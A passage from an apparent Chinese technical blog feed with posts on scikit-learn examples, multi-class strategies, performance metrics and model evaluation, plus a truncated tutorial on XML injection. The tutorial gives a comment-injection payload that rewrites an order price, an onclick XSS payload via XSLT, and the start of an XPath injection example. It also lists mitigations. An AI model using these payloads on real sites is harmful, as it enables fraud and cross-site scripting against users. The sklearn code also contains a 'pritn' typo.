class="hljs-selector-id">#print</span>(iris_y)<br><br>x_trian,x_test,y_train,y_test = train_test_split(iris_x,iris_y,test_size=<span class="hljs-number">0.25</span>)<br><br><span class="hljs-selector-id">#print</span>(y_train)<br><br>knn = KNeighborsClassifier()<br>knn<span class="hljs-selector-class">.fit</span>(x_trian,y_train)<br>y_predict = knn<span class="hljs-selector-class">.predict</span>(x_test)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(y_predict)</span></span><br><span class="hljs-function"><span class="hljs-title">pritn</span><span class="hljs-params">(y_test)</span></span><br></code></pre></td></tr></table></figure><ul><li>上面的代码从sklearn的数据库导入了鸢尾花数据集，然后将data作为特征，target作为标签。</li><li>然后通过train_test_split方法将特征和标签分成训练集和测试集并打乱顺序，其中test_size控制测试集占比0.25。</li><li>然后使用KNeighborsClassifier机器学习方法，学习训练集，并用训练好的模型预测测试集中x_test对应的分类结果。</li><li>最后将预测的分类结果y_predict与原始数据中的分类结果y_test输出后对比</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn04.png?raw=true"></p><p>从最终输出结果可以看到，基本都预测成功了，如果我们样本量更大一点，或许会找到一些错误预测结果。</p><h2 id="0x05-scikit-learn学习与预测（回归问题）"><a href="#0x05-scikit-learn学习与预测（回归问题）" class="headerlink" title="0x05 scikit-learn学习与预测（回归问题）"></a>0x05 scikit-learn学习与预测（回归问题）</h2><p>再使用datasets中提供的自动生成数据的方法来预测一个回归问题。同样先贴代码：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import numpy as np<br>from sklearn import datasets<br>from sklearn<span class="hljs-selector-class">.linear_model</span> import LinearRegression<br>import matplotlib<span class="hljs-selector-class">.pyplot</span> as plt<br><br><br>example_x,example_y = datasets<span class="hljs-selector-class">.make_regression</span>(n_samples=<span class="hljs-number">100</span>,n_features=<span class="hljs-number">1</span>,n_targets=<span class="hljs-number">1</span>,noise=<span class="hljs-number">3</span>)<br><br>plt<span class="hljs-selector-class">.scatter</span>(example_x,example_y)<br>plt<span class="hljs-selector-class">.show</span>()<br><br>lr = LinearRegression()<br>lr<span class="hljs-selector-class">.fit</span>(example_x,example_y)<br><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lr.predict(example_x[:<span class="hljs-number">5</span>,:])</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(example_y[:<span class="hljs-number">5</span>])</span></span><br></code></pre></td></tr></table></figure><ul><li>上面代码中，首先使用make_regression生成随机的回归数据，其中n_samples代表数据数量，n_features代表特征数量，n_targets代表特征数量，noise代表噪声大小</li><li>然后使用matplotlib模块将生成的二维数据绘制出来</li><li>接着使用LinearRegression机器学习方法，学习训练集，并用训练好的模型预测样本中前五个数据</li><li>最后将预测结果与原始数据的标签值输出进行对比</li></ul><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn05.png?raw=true"></p><p>从二维图形可以看出生成数据的分布。</p><p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn06.png?raw=true"></p><p>从输出结果可以看出，预测结果基本符合，但是有一定的误差。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(7)——多分类学习</title>
    <link href="/2018/07/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-7-%E2%80%94%E2%80%94%E5%A4%9A%E5%88%86%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
    <url>/2018/07/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-7-%E2%80%94%E2%80%94%E5%A4%9A%E5%88%86%E7%B1%BB%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在逻辑回归中也提到了多分类问题，但是仅仅介绍了其中一种情况。多分类还存在一些其他的方式与问题，在这里总结一遍，用作笔记。</p><p>除过那些直接可以由二分类算法推广到多分类的情况，我们就是基于一些策略利用二分类学习器来解决多分类问题。</p><h2 id="0x01-一对一-One-vs-One"><a href="#0x01-一对一-One-vs-One" class="headerlink" title="0x01 一对一(One vs. One)"></a>0x01 一对一(One vs. One)</h2><p>OvO策略是将N个类别，两两配对分类，一共就产生了N(N-1)/2个二分类任务。在测试阶段，我们将新样本提交给所有的分类器，一共得到N(N-1)/2个分类结果，而最终这个新样本属于哪一类，可以通过投票产生，即这N(N-1)/2个分类结果中，预测得到最多得那个分类作为最终分类结果。</p><h2 id="0x02-一对其余-One-vs-Rest"><a href="#0x02-一对其余-One-vs-Rest" class="headerlink" title="0x02 一对其余(One vs. Rest)"></a>0x02 一对其余(One vs. Rest)</h2><p>OvR策略是将N个类别，每次分别取一类作一次正例，其余类都作为反例，一共训练N个分类器。在测试阶段，我们将新样本提交给所有分类器，一共产生N个分类结果，这N个结果中置信度最高的一个就是最终结果。</p><h2 id="0x03-多对多-Many-vs-Many"><a href="#0x03-多对多-Many-vs-Many" class="headerlink" title="0x03 多对多(Many vs. Many)"></a>0x03 多对多(Many vs. Many)</h2><p>MvM策略是每次将一部分类作为正类，一部分其他类作为反类。MvM的正反类构造不能随意选取，必须有特殊的设计。</p><p>最常用的MvM技术是“纠错输出码”(Error Correcting Output Codes)</p><p>纠错输出码是将编码的思想引入类别拆分，并尽可能在解码的过程中具有容错性。纠错输出码的工作过程：</p><ul><li>（1）编码：对N个类别做M次划分，每次划分将一部分类别划为正类，一部分划为反类，从而形成一个二分类训练集。这样一共产生M个训练集，可以训练出M个分类器。</li><li>（2）解码：M个分类器分别对测试样本进行预测，这些预测标记组成一个编码，将这个预测编码与每个类别各自的编码进行比较，返回其中距离最小的类别作为最终预测结果。</li></ul><p>类别划分时使用编码矩阵表示，目前主要的编码矩阵是二元码和三元码：</p><ul><li>二元码： 每个类别有正类、反类两种情况。</li><li>三元码： 每个类别有正类、反类、停用类三种情况。</li></ul><p>如图所示：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_01.png?raw=true"></p><p>以二元码为例，图中使用五个分类器进行MvM分类，然后根据对不同类别的正反分类构成了黑白相间的编码矩阵。</p><p>在解码时，我们将样例输入到五个分类器中，得到一个长度为5的测试样例，然后跟矩阵中c1、c2、c3、c4四个类别的编码方式比较，计算其欧氏距离，距离最小的类别c3就是最终预测结果，也就是说此样例被分类到c3。</p><p>如果MvM用到的分类器越多，横轴也会越长，编码长度也就越长，这样即使有个别分类器预测错误，也不会影响最终结果。也就是说，分类器越多纠错能力越强。不过分类器越多，我们需要训练的次数也就越多，计算量就会增大，所以应当根据实际情况选择合适的分类器数量。</p><h2 id="0x04-类别不平衡问题"><a href="#0x04-类别不平衡问题" class="headerlink" title="0x04 类别不平衡问题"></a>0x04 类别不平衡问题</h2><p>在通常的分类任务中，我们默认几类几类情况的发生几率差距不是特别大，但是如果某一类情况发生几率十分大，比如99.9%，另一类发生几率特别小，比如0.1%。</p><p>这种情况下，我们的样本正例太多，反例太少，学习器往往会出现一些误差。</p><p>此时我们需要用m+表示正例数目，m-表示反例数目，观测几率就是m+/m-，这个时候我们只需要分类器预测几率高于观测几率就应判定为正例，即</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_02.png?raw=true"></p><p>但是我们的分类器是根据y/(1-y)进行决策的，为了适应它，我们只需要“再缩放”一下：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_03.png?raw=true"></p><h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05 参考文档"></a>0x05 参考文档</h2><p>《机器学习》——周志华</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(6)——性能度量</title>
    <link href="/2018/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-6-%E2%80%94%E2%80%94%E6%80%A7%E8%83%BD%E5%BA%A6%E9%87%8F/"/>
    <url>/2018/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-6-%E2%80%94%E2%80%94%E6%80%A7%E8%83%BD%E5%BA%A6%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-性能度量"><a href="#0x00-性能度量" class="headerlink" title="0x00 性能度量"></a>0x00 性能度量</h2><p>对学习器泛化性能进行评估时，不仅需要有效可行的实验估计方法，还需要有衡量模型泛化能力的评价标准，这就是性能度量。</p><p>性能度量反映任务需求，在对比不同模型的能力时，使用不同的性能度量往往会导致不同的评判结果，也就是说，模型的好坏是相对的，需要根据实际情况进行选择。</p><h2 id="0x01-回归任务中的性能度量"><a href="#0x01-回归任务中的性能度量" class="headerlink" title="0x01 回归任务中的性能度量"></a>0x01 回归任务中的性能度量</h2><p>回归任务中最常用的性能度量是“均方误差”(mean squared error)</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true"></p><p>对于一般的数据分布D和概率密度函数p，均方误差可以表示为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_02.png?raw=true"></p><h2 id="0x02-分类任务中的性能度量"><a href="#0x02-分类任务中的性能度量" class="headerlink" title="0x02 分类任务中的性能度量"></a>0x02 分类任务中的性能度量</h2><h3 id="错误率与精度"><a href="#错误率与精度" class="headerlink" title="错误率与精度"></a>错误率与精度</h3><p>分类任务中最常用的两种性能度量就是错误率和精度，同时适用于二分类和多分类任务。</p><p>错误率是分类错误的样本数占样本总数的比例。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_01.png?raw=true"></p><p>精度是分类正确的样本数占样本总数的比例。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_04.png?raw=true"></p><p>对于一般的数据分布D和概率密度函数p，错误率和精度可以表示为：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_05.png?raw=true"></p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_06.png?raw=true"></p><h3 id="查准率、查全率与F1"><a href="#查准率、查全率与F1" class="headerlink" title="查准率、查全率与F1"></a>查准率、查全率与F1</h3><p>错误率和精度只能表示一部分的性能，如果我们要深入的研究这个问题，就需要用到别的性能度量。</p><p>查准率P是我们检索到的样本中有多少比例是正确的。</p><p>查全率R是正确的样本中有多少被检索到了。</p><table><thead><tr><th>真实情况\预测结果</th><th>正例</th><th>反例</th></tr></thead><tbody><tr><td>正例</td><td>TP(真正例)</td><td>FN(假反例)</td></tr><tr><td>反例</td><td>FP(假正例)</td><td>TN(真反例)</td></tr></tbody></table><p>从定义我们就可以得出，差准率和查拳率是一堆矛盾的变量。一般情况下，查准率高时查全率就会低；查全率高时查准率就会低。</p><p>如果我们我们根据学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。按照这个顺序逐个把样本作为正确的进行预测，则每次可以计算出当前查全率、查准率。</p><p>然后以查准率为纵轴，查全率为横轴作图，就得到了查准率-查全率曲线，也称为“P-R”曲线。</p><p>如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_07.png?raw=true"></p><p>P-R图可以直观的表示学习器在总样本上的查全率和查准率，如果一个学习器的P-R曲线被另一个学习器的P-R曲线完全包住，则可以断言后者的性能优于前者。如果P-R曲线交叉，则需要根据实际的需求来进行比较。如果一定要把学习器的性能分个高低，一个比较合理的判据是比较P-R曲线下面积的大小，它在一定程度上表征了学习器在查准率和查全率上取得相对“双高”的比例。</p><p>这个面积值不容易估算，所以又设计了一些综合考虑查准率和查全率的性能度量。平衡点（Break-Event Point）就是这样一个度量，它是“查准率=查全率”时的取值，可以通过比较BEP值来比较学习器的性能。</p><p>但是BEP过于简化，我们更常用的的是F1度量：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_08.png?raw=true"></p><p>其中TP是假设正确并且实际正确的样例数，TN是假设错误并且实际错误的样例数。</p><p>在实际的应用中，我们要根据不同需求改变对查准率和查全率的重视程度。如商品推荐中应该尽可能推荐用户最感兴趣的，查准率更重要；在逃犯信息检索中，需要尽可能不漏掉逃犯，所以查全率更重要。所以就引出了F1度量的一般形势Fβ，能表达出对查准率和查全率的不同偏好。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_09.png?raw=true"></p><p>其中β代表查全率与查准率的相对重要性，在β=1时，就是F1；在β&gt;1时，查全率更重要；在β&lt;1时，查准率更重要。</p><h3 id="ROC与AUC"><a href="#ROC与AUC" class="headerlink" title="ROC与AUC"></a>ROC与AUC</h3><p>在分类时，我们会选择一个阈值判别，我们将学习器的预测结果对样例排序，最可能正确的排在最前，最可能错误的排在最后。然后我们可以通过一个截断点来把样本分成两部分。在不同的任务中，我们可以根据实际的需求选择不同位置的截断点，如果我们更重视“查准率”，则可以选择排序中靠前的位置进行截断；若更重视“查全率”，则可选择靠后的位置进行截断。</p><p>ROC全称是“受试者工作特征”曲线，我们根据学习器的预测结果对样例进行排序，按此顺序逐个把样本作为正例进行预测，每次计算出两个重要量的值，分别以它们为横纵坐标做图，就得到了ROC曲线。与P-R曲线使用查准率、查全率为横、纵轴不同，ROC曲线纵轴是“真正例率”（TPR），横轴是“假正例率”（FPR）。</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_10.png?raw=true"></p><p>进行学习器比较时，若一个学习器的ROC曲线被另一个学习器的ROC曲线完全包裹，那么可以断言后者性能优于前者，若两个学习器发生交叉，则比较ROC曲线下的面积，即AUC(Area Under ROC Curve)</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_11.png?raw=true"></p><h3 id="代价敏感错误率与代价曲线"><a href="#代价敏感错误率与代价曲线" class="headerlink" title="代价敏感错误率与代价曲线"></a>代价敏感错误率与代价曲线</h3><p>在现实情况中，分类错误之后不同类型错误所造成的后果也不同，比如安检通道把钥匙等金属制品错误的分类到危险品，仅仅是多了一层人工检查的麻烦；但是如果把一把刀错误的分类到安全品里面，那么可能造成十分严重的后果。不同的错误造成的损失是不同的，为了权衡这个损失，可以为错误赋予“非均等代价”(unequal cost)。</p><p>我们可以用一张表来代表代价：</p><table><thead><tr><th>真实类别\预测类别</th><th>第0类</th><th>第1类</th></tr></thead><tbody><tr><td>第0类</td><td>0</td><td>cost01</td></tr><tr><td>第1类</td><td>cost10</td><td>0</td></tr></tbody></table><p>如果是多分类问题，costij代表第i类的错误被归到第j类所引起的代价。</p><p>我们前面的几种方法都是以最小化错误次数为目标的，也就是认为所有错误的代价是均等的。</p><p>在非均等代价下，就需要代价曲线来表示学习器的总体代价。代价曲线图的横轴取值为[0,1]的正例概率代价：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_12.png?raw=true"></p><p>代价曲线的绘制则是ROC上每一点对应了代价平面上的一条线段，设ROC曲线上点的坐标是(TPR,FPR)，则可以计算出FNR，然后在代价平面上绘制一条从(0,FPR)到(1,FNR)的线段，线段下的面积即表示了该条件下的期望总体代价。</p><p>然后将ROC曲线上的每个点都这样转换成一条线段，再取所有线段的下界，围成的面积即为在所有条件下学习器的期望总体代价。如图：</p><p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml6_13.png?raw=true"></p><h2 id="0x03-参考文档"><a href="#0x03-参考文档" class="headerlink" title="0x03 参考文档"></a>0x03 参考文档</h2><p>《机器学习》——周志华</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习(5)——模型评估方法</title>
    <link href="/2018/07/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-5-%E2%80%94%E2%80%94%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95/"/>
    <url>/2018/07/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-5-%E2%80%94%E2%80%94%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-模型评估与选择"><a href="#0x00-模型评估与选择" class="headerlink" title="0x00 模型评估与选择"></a>0x00 模型评估与选择</h2><p>在机器学习中，我们需要对使用的模型进行评估，对误差等进行分析，来选择一个预测准确率最高的模型。</p><h2 id="0x01-误差"><a href="#0x01-误差" class="headerlink" title="0x01 误差"></a>0x01 误差</h2><p>我们把学习器的实际预测输出与样本的真实输出之间的差异称为误差。</p><ul><li><p>经验误差：学习器在训练集上的误差称为训练误差或经验误差。</p></li><li><p>泛化误差：将训练好的模型用在新样本上的误差称为泛化误差。</p></li></ul><p>机器学习的目的是为了预测新样本的情况，所以我们需要在新样本上表现很好的学习器，即需要得到一个泛化误差小的学习器。</p><h2 id="0x02-过拟合与欠拟合"><a href="#0x02-过拟合与欠拟合" class="headerlink" title="0x02 过拟合与欠拟合"></a>0x02 过拟合与欠拟合</h2><ul><li><p>过拟合：学习器把训练样本自身的一些特点当作了所有潜在样本都会具有的一般性质，导致泛化性能下降。一般是由于学习能力过强，将训练样本所包含的不太一般的性质都学到了。</p></li><li><p>欠拟合：学习器学习能力过弱，对训练样本的一般性质尚未学好</p></li></ul><p>欠拟合比较容易克服，可以在决策树学习中扩展分支、在神经网络中增加训练轮数等。</p><p>过拟合则难克服，过拟合是机器学习面临的关键障碍，各类学习算法都有一些针对过拟合的措施来缓解过拟合。</p><h2 id="0x03-评估方法"><a href="#0x03-评估方法" class="headerlink" title="0x03 评估方法"></a>0x03 评估方法</h2><p>为了对学习器的泛化误差进行评估，需要使用一个测试集来测试学习器对新样本的判别能力，然后以测试集上的测试误差作为泛化误差的近似。</p><p>测试集应该尽量与训练集互斥，即测试样本尽量不在训练集中出现、未在训练集中使用过。</p><p>下来介绍几种常用的评估方法：</p><h3 id="留出法"><a href="#留出法" class="headerlink" title="留出法"></a>留出法</h3><p>留出法是直接将数据集D划分为两个互斥的几何，其中一个集合作为训练集S，另一个作为测试集T。</p><p>在训练集S中训练出模型后，用测试集T来评估其测试误差，作为对泛化误差的估计。</p><p>训练/测试集要尽可能的保证数据分布的一致性，避免因数据划分过程引入额外的偏差而对最终结果产生影响。具体做法是尽可能保留类别比例，最好使用分层采样的方法。</p><h3 id="交叉验证法"><a href="#交叉验证法" class="headerlink" title="交叉验证法"></a>交叉验证法</h3><p>交叉验证法先将数据集D划分为k个大小相似的互斥子集，每个子集尽可能的保证数据分布的一致性。<br>然后每次使用k-1个子集作为训练集，余下的一个子集作为测试集。<br>这样就可以得到k组训练/测试集，可以进行k次训练和测试，最终返回的是k个测试结果的均值。</p><p>交叉验证法评估结果的稳定性和保真性在很大程度上取决于k的取值。<br>通常将交叉验证法称为“k折交叉验证”。如k取10，则称为10折交叉验证。</p><h3 id="留一法"><a href="#留一法" class="headerlink" title="留一法"></a>留一法</h3><p>如果数据集D中包含m个样本，若令k=m，则得到了交叉验证法的一个特例：留一法。</p><p>显然，留一法不受随机样本划分方式的影响，因为留一法只有唯一一种划分方式。</p><p>留一法的评估结果往往被认为比较准确。但是留一法也存在缺陷，当数据集较大时，训练m个模型的计算开销非常大。比如我们是上千万级的数据，那么就得训练上千万个模型，这是不现实的。</p><h3 id="自助法"><a href="#自助法" class="headerlink" title="自助法"></a>自助法</h3><p>上述几种方法都存在一个问题，那就是由于保留了一部分样本用于测试，导致实际评估的模型所使用的训练集比D小，会引起一些误差，而自助法，可以解决这个问题。</p><p>自助法以自助采样法为基础，给定包含m个样本的数据集D，对它进行采样产生数据集D’：<br>每次随机从D中挑选一个样本，再将样本放回初始数据集中，使得该样本在下次采样时仍有可能被采到。这个过程重复执行m次后，我们就得到了包含m个样本的数据集D’，这就是自助采样的结果。</p><p>D中有一部分样本会在D’中多次出现，而另一部分样本不出现。可以做一个简单的估计，样本在m次采样中始终不被采到的概率是<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_01.png?raw=true"></p><p>取极限得到<br><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml5_02.png?raw=true"></p><p>即通过自助采样，初始数据集中约有36.8%的样本未出现在采样数据集D’中，于是我们可以将D’用作训练集，D-D’用作测试集，这样世纪评估的模型与期望评估的模型都使用了m个训练样本，而我们仍然有数据总量36.8%、未在训练集中出现的样本用于测试。这样的测试结果，也被称为“包外估计”。</p><p>自助法在数据集较小、难以有效划分训练/测试集时很有用；此外，自助法能从初始数据集中产生多个不同的训练集，这对集成学习等方法有很大的好处。</p><p>自助法的缺陷是：自助法产生的数据集改变了初始数据集的分布，这会引入估计误差。</p><p>所以在初始数据集够用的情况下，留出法和交叉验证法更常用。</p><h2 id="0x04-调参与最终模型"><a href="#0x04-调参与最终模型" class="headerlink" title="0x04 调参与最终模型"></a>0x04 调参与最终模型</h2><p>大多数学习算法都有参数需要设定，参数配置不同，学得模型的性能往往有显著差别。因此，在进行模型评估与选择时，除了要对适用学习算法进行选择，还需要对算法参数进行设定，这就是通常所说的“参数调节”。</p><p>给定包含m个样本的数据集D，在模型评估与选择过程中由于需要留出一部分数据进行评估测试，事实上我们只使用了一部分数据训练模型。因此，在模型选择完成后，学习算法和参数配置已选定，我们要用数据集D重新训练模型，使用所有的m个样本。这时产生的模型才是最终模型。</p>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xml注入攻击总结</title>
    <link href="/2018/07/23/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/"/>
    <url>/2018/07/23/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前的博客中，详细的讲了xxe(外部实体注入攻击)，那是一种典型的xml注入攻击，但是xml注入利用的手法还有很多，下来详细的介绍一下xml的其他利用手法。</p><h2 id="0x01-xml数据注入"><a href="#0x01-xml数据注入" class="headerlink" title="0x01 xml数据注入"></a>0x01 xml数据注入</h2><p>xml数据注入，就是通过一些方式，将本来无法更改的xml中的数据更改。</p><p>我们假设一种情况，比如一个购物网站的某处xml代码如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>13200000000<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>200<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>shanghai<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>假如这里phone中是电话号码，price中是价格，address中是地址。购物网站中，电话号码和地址是用户可控的，价格是用户不可控的。</p><p>但是如果用户的输入没有经过严格的过滤就写入xml，然后再提取出来使用时，我们就可以通过控制phone和address来更改price的值。</p><p>我们可以在phone中手动闭合前面的phone并构造注释符：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">13200000000</span>&lt;/phone&gt;&lt;!<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>然后在address的值中闭合注释符，然后构造一个新的price，输入我们想要的价格：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">--&gt;<span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>shanghai<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br></code></pre></td></tr></table></figure><p>拼接起来就是</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">phone</span>&gt;</span>13200000000<span class="hljs-tag">&lt;/<span class="hljs-name">phone</span>&gt;</span><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">&lt;price&gt;200&lt;/price&gt;</span><br><span class="hljs-comment">&lt;address&gt;--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span>shanghai<span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后注释符注释掉中间的部分，剩下的价格就变成了1元。</p><p>这就是xml数据注入攻击。</p><h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul><li>严格过滤用户输入</li></ul><h2 id="0x02-xml样式表注入"><a href="#0x02-xml样式表注入" class="headerlink" title="0x02 xml样式表注入"></a>0x02 xml样式表注入</h2><p>在xml文件中允许使用样式表，这种样式表能够将已有的xml数据转换成新的xml数据，然后以html方式在web浏览器中展示。</p><p>假设xml引用了一个超链接，而链接内容用户可控</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span><br></code></pre></td></tr></table></figure><p>web服务器利用xstl语言将上面的xml转换成这样的html：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">A</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">A</span>&gt;</span><br></code></pre></td></tr></table></figure><p>那么如果我们将test改为</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-string">&quot;#&quot;</span> onclick=<span class="hljs-string">&quot;alert(1)&quot;</span> /&gt;&lt;!<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>那么很容易引发跨站脚本攻击。</p><p>如果引发了跨站脚本攻击，我们将onclick之后的内容改成我们xss盲打平台上的内容，就可以实施攻击了。</p><h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul><li>严格过滤用户输入</li><li>敏感位置不能使用户可控</li></ul><h2 id="0x03-XPATH-XQuery注入"><a href="#0x03-XPATH-XQuery注入" class="headerlink" title="0x03 XPATH/XQuery注入"></a>0x03 XPATH/XQuery注入</h2><p>XPATH和XQuery是能够查询xml文档的语言，类似于结构化查询语言(sql)，假设xml中包含账号密码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>jack<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>alice<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>abc123456<span 